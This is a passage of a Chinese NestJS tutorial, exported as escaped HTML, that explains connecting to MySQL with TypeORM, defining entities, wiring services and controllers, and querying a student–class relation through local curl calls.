class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Entity</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> Student &#123;</span><br><span class=\"line\">  <span class=\"comment\">// id name updateDate, createDate...</span></span><br><span class=\"line\">  <span class=\"meta\">@ManyToOne</span>(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> Classes, <span class=\"function\"><span class=\"params\">classes</span> =&gt;</span> classes.students)</span><br><span class=\"line\">  <span class=\"keyword\">class</span>: Classes;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>注意：<code>classes</code> 表引用 <code>students</code> 是通过新建字段(<code>students\\class</code>)进行关联。</p><p>引用会最终在数据库变成<code>外键</code>连接。</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show create table student;</span><br><span class=\"line\">// =&gt;  CREATE TABLE `student` (</span><br><span class=\"line\">//   `id` int NOT NULL AUTO_INCREMENT,</span><br><span class=\"line\">//   `name` varchar(255) NOT NULL,</span><br><span class=\"line\">//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//   `classId` int DEFAULT NULL,    // 👈 注意这里</span><br><span class=\"line\">//   PRIMARY KEY (`id`),</span><br><span class=\"line\">//   KEY `FK_bd5c8f2ef67394162384a484ba1` (`classId`), // 👈 注意这里</span><br><span class=\"line\">//   CONSTRAINT `FK_bd5c8f2ef67394162384a484ba1` FOREIGN KEY (`classId`) REFERENCES `classes` (`id`) // 👈 注意这里</span><br><span class=\"line\">// ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// 而 classes 表并无链接</span><br><span class=\"line\">show create table classes;</span><br><span class=\"line\">// CREATE TABLE `classes` (</span><br><span class=\"line\">//   `id` int NOT NULL AUTO_INCREMENT,</span><br><span class=\"line\">//   `className` varchar(255) NOT NULL,</span><br><span class=\"line\">//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//   PRIMARY KEY (`id`)</span><br><span class=\"line\">// ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br></pre></td></tr></table></figure><p>再引入表，详细操作可看第四步。</p><p><code>students.module.ts</code> 引入表<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.module.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Classes &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/classes.entity'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">    imports: [TypeOrmModule.forFeature([Student, Classes])],</span><br><span class=\"line\">    providers: [StudentsService, Student, Classes],</span><br><span class=\"line\">    <span class=\"comment\">// ..</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsModule &#123;&#125;</span><br></pre></td></tr></table></figure><p></p><p><code>students.service.ts</code> 引入表, 并实现 <code>setClass</code>, <code>getClass</code> 方法</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Classes &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/classes.entity'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@InjectRepository</span>(Student)</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">private</span> readonly studentRepository: Repository&lt;Student&gt;,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@InjectRepository</span>(Classes)</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">private</span> readonly classRepository: Repository&lt;Classes&gt;,</span></span><br><span class=\"line\"><span class=\"params\">    </span>) &#123;&#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">     <span class=\"keyword\">async</span> setClass(name: <span class=\"built_in\">string</span>, studentIds: <span class=\"built_in\">number</span>[]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> students = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.studentRepository.find(&#123; where: studentIds &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">const</span> result = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.classRepository.save(&#123;</span><br><span class=\"line\">            className: name,</span><br><span class=\"line\">            students: students, <span class=\"comment\">// 此处直接保存students 的实例，即直接从数据库取出来的数据</span></span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">async</span> findClass(id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> result = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.classRepository.find(&#123;</span><br><span class=\"line\">            where: &#123; id &#125;,</span><br><span class=\"line\">            relations: [<span class=\"string\">'students'</span>]</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>新增 <code>ClassesDto</code><br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// classes.dto.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; IsNotEmpty, IsString &#125; <span class=\"keyword\">from</span> <span class=\"string\">'class-validator'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> ClassesDto &#123;</span><br><span class=\"line\">    <span class=\"meta\">@IsNotEmpty</span>()</span><br><span class=\"line\">    <span class=\"meta\">@IsString</span>()</span><br><span class=\"line\">    className: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    students: <span class=\"built_in\">number</span>[]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p><code>students.controller.ts</code> 修改<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"comment\">// import ...</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"comment\">// constructor ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'get-class'</span>)</span><br><span class=\"line\">    getClass(<span class=\"meta\">@Query</span>(<span class=\"string\">'id'</span>, ParseIntPipe) id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.findClass(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'set-class'</span>)</span><br><span class=\"line\">    setClass(<span class=\"meta\">@Body</span>() classes: ClassesDto) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.setClass(classes.className, classes.students);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p><code>调用接口</code>，先插入数据再查询数据。</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 再新增一条数据</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/<span class=\"built_in\">set</span>-student-name -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx1\"&#125;'</span></span><br><span class=\"line\"></span><br><span class=\"line\">// 插入 classes 数据</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/<span class=\"built_in\">set</span>-class -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"className\": \"blog\", \"students\": [1,2]&#125;'</span></span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 通过浏览器，查询长啥样</span><br><span class=\"line\">http://localhost:3000/students/get-class?id=1</span><br><span class=\"line\">// =&gt; [&#123;</span><br><span class=\"line\">//  id: 1,</span><br><span class=\"line\">    className: <span class=\"string\">\"blog\"</span>,</span><br><span class=\"line\">    updateDate: <span class=\"string\">\"2021-09-15T01:05:38.055Z\"</span>,</span><br><span class=\"line\">    createDate: <span class=\"string\">\"2021-09-15T01:05:38.055Z\"</span>,</span><br><span class=\"line\">    students: [&#123;</span><br><span class=\"line\">        id: 1,</span><br><span class=\"line\">        name: <span class=\"string\">\"gdccwxx\"</span>,</span><br><span class=\"line\">        updateDate: <span class=\"string\">\"2021-09-15T01:05:38.000Z\"</span>,</span><br><span class=\"line\">        createDate: <span class=\"string\">\"2021-09-15T01:05:23.988Z\"</span></span><br><span class=\"line\">    &#125;,&#123;</span><br><span class=\"line\">        id: 2,</span><br><span class=\"line\">        name: <span class=\"string\">\"gdccwxx1\"</span>,</span><br><span class=\"line\">        updateDate: <span class=\"string\">\"2021-09-15T01:05:38.000Z\"</span>,</span><br><span class=\"line\">        createDate: <span class=\"string\">\"2021-09-15T01:05:28.084Z\"</span></span><br><span class=\"line\">    &#125;]</span><br><span class=\"line\">&#125;]</span><br></pre></td></tr></table></figure><h1 id=\"七、简单回顾\"><a href=\"#七、简单回顾\" class=\"headerlink\" title=\"七、简单回顾\"></a>七、简单回顾</h1><p>再回顾下本章：</p><ul><li>使用 <code>typeorm</code> 和 <code>mysql</code> 建立连接</li><li>使用 <code>entity</code> 文件创建数据库表</li><li><code>service</code> 使用对数据库的简单调用，包括<code>写入</code>和<code>读取</code></li><li>使用关系查询，将 <code>student</code> 和 <code>classes</code> 连接写入和查询</li></ul><p>至此，我们使用 <code>typeorm</code> 和 <code>mysql</code> 连接数据库就完成了。</p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><p><a href=\"/nestJs/nest-js-tutorial-4/\" title=\"下章\">下章</a>我们将主要讲 <code>NestJs</code> 的高级用法，包括 <code>管道</code>、<code>守卫</code>和<code>拦截器</code>。期待你的阅读。</p>","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/nestJs/nest-js-tutorial-3/nestjs.png\" alt=\"nestjs\"></p><p>这个系列的<a href=\"/nestJs/nest-js-tutorial-2/\" title=\"上一篇\">上一篇</a>文章，实现了 <code>Post</code> 接口和对接口的基础操作。</p><p>而真正的服务往往包括数据存储。</p><p>本篇将介绍如何建立 NestJs 的数据库连接、并使用数据库联表查询。这样就就是完整的后台服务了。</p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><p>本篇使用 <code>mysql</code> 作为数据库连接。使用 <code>NestJs</code> 内置的<a href=\"https://docs.nestjs.com/techniques/database\" target=\"_blank\" rel=\"noopener\">数据库连接</a> <code>typeorm</code>，可在 <a href=\"https://typeorm.io/\" target=\"_blank\" rel=\"noopener\">这里</a> 查阅 typeorm 详细文档</p><h1 id=\"一、开发准备\"><a href=\"#一、开发准备\" class=\"headerlink\" title=\"一、开发准备\"></a>一、开发准备</h1><ol><li><a href=\"https://dev.mysql.com/downloads/mysql/\" target=\"_blank\" rel=\"noopener\">下载</a>并安装 Mysql</li><li><p>创建 school 库</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create database school;</span><br></pre></td></tr></table></figure></li><li><p>安装 @nestjs/typeorm typeorm mysql2</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save @nestjs/typeorm typeorm mysql2</span><br></pre></td></tr></table></figure></li></ol><h1 id=\"二、数据库连接\"><a href=\"#二、数据库连接\" class=\"headerlink\" title=\"二、数据库连接\"></a>二、数据库连接</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app.module.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Module &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; AppController &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./app.controller'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; AppService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./app.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsController &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students/students.controller'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; TypeOrmModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  imports: [</span><br><span class=\"line\">    StudentsModule,</span><br><span class=\"line\">    TypeOrmModule.forRoot(&#123;</span><br><span class=\"line\">      <span class=\"keyword\">type</span>: <span class=\"string\">'mysql'</span>,</span><br><span class=\"line\">      host: <span class=\"string\">'127.0.0.1'</span>,</span><br><span class=\"line\">      port: <span class=\"number\">3306</span>,</span><br><span class=\"line\">      username: <span class=\"string\">'root'</span>,</span><br><span class=\"line\">      password: <span class=\"string\">'1qaz2wsx'</span>,</span><br><span class=\"line\">      database: <span class=\"string\">'school'</span>,</span><br><span class=\"line\">      autoLoadEntities: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      synchronize: <span class=\"literal\">true</span>, <span class=\"comment\">// 数据库自动同步 entity 文件修改</span></span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  controllers: [AppController],</span><br><span class=\"line\">  providers: [AppService],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> AppModule &#123;&#125;</span><br></pre></td></tr></table></figure><p>初始化数据库连接。</p><p><code>autoLoadEntities</code> 自动化 load entity 文件, \b\b所有在 Module 中引用的 Entity 文件会被自动加载。自动加载设置为 true 即可。</p><p><code>synchronize</code> 自动化同步表，本地可自动打开，线上数据库不建议打开。</p><h1 id=\"三、定义表结构\"><a href=\"#三、定义表结构\" class=\"headerlink\" title=\"三、定义表结构\"></a>三、定义表结构</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;</span><br><span class=\"line\">    Entity,</span><br><span class=\"line\">    Column,</span><br><span class=\"line\">    PrimaryGeneratedColumn,</span><br><span class=\"line\">    UpdateDateColumn,</span><br><span class=\"line\">    CreateDateColumn,</span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Entity</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> Student &#123;</span><br><span class=\"line\">  <span class=\"meta\">@PrimaryGeneratedColumn</span>()</span><br><span class=\"line\">  id: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'varchar'</span> &#125;)</span><br><span class=\"line\">  name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@UpdateDateColumn</span>()</span><br><span class=\"line\">  updateDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@CreateDateColumn</span>()</span><br><span class=\"line\">  createDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>@Entity</code> 注解代表是数据库入口文件；</li><li><code>@Column</code> 是基础列文件，使用 <code>type</code> 字段定义在数据库实际存储</li><li><code>@PrimaryGeneratedColumn</code> 代表单调递增的主键</li><li><code>@UpdateDateColumn</code>\b 当记录修改时会修改时间</li><li><code>@CreateDateColumn</code>\b 当记录新增时会写入时间</li></ul><h1 id=\"四、引用表\"><a href=\"#四、引用表\" class=\"headerlink\" title=\"四、引用表\"></a>四、引用表</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.module.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Module &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Student &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/students.entity'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; TypeOrmModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsController &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.controller'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.service'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">    imports: [TypeOrmModule.forFeature([Student])],</span><br><span class=\"line\">    providers: [StudentsService, Student],</span><br><span class=\"line\">    controllers: [StudentsController],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsModule &#123;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>imports</code> 引用 typeorm 模块， entity 才可以在 service 中使用</li><li><code>providers</code> service 的 constructor 需要引用哪些模块</li><li><code>controllers</code> 模块的 controller</li></ul><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable, Logger &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; InjectRepository &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Repository &#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Student &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/students.entity'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@InjectRepository</span>(Student)</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">private</span> readonly studentRepository: Repository&lt;Student&gt;,</span></span><br><span class=\"line\"><span class=\"params\">    </span>) &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>这样会在 db 中建立 students 新表。</p><p>使用 <code>show create table</code> 能看表的详细信息。</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use school;</span><br><span class=\"line\"></span><br><span class=\"line\">show tables;</span><br><span class=\"line\"></span><br><span class=\"line\">// =&gt; | student | CREATE TABLE `student` (</span><br><span class=\"line\">//  `id` int NOT NULL AUTO_INCREMENT,</span><br><span class=\"line\">//  `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//  `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//  `name` varchar(255) NOT NULL,</span><br><span class=\"line\">//  PRIMARY KEY (`id`)</span><br><span class=\"line\">// ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci |</span><br></pre></td></tr></table></figure><h1 id=\"五、与数据库交互\"><a href=\"#五、与数据库交互\" class=\"headerlink\" title=\"五、与数据库交互\"></a>五、与数据库交互</h1><p>到这一步，终于可以和数据库进行交互了。基本上和数据库交互的部分都会放在 service 层，因此 <code>新增</code> 和 <code>查询</code> 都放在 service 层。</p><p>其中包括了</p><ul><li><code>getStudentName</code> 的改造</li><li><code>setStudent</code> 函数的新增</li></ul><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"comment\">// import ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"comment\">// logger, constructor ImStudent getStudentName ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> getStudentName(id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.logger.log(<span class=\"string\">`get student id is <span class=\"subst\">$&#123;id&#125;</span>`</span>);</span><br><span class=\"line\">        <span class=\"keyword\">const</span> results = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.studentRepository.find(&#123; id &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> results ?? <span class=\"string\">'not found'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> setStudent(name: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> results = <span class=\"keyword\">this</span>.studentRepository.create(&#123; name &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> results;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>通过使用 <code>find</code> 和 <code>create</code> 对学生查询和创建。结果也是异步的。</p><p>下面对 <code>controller</code> 进行改造，使得函数调用串起来。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 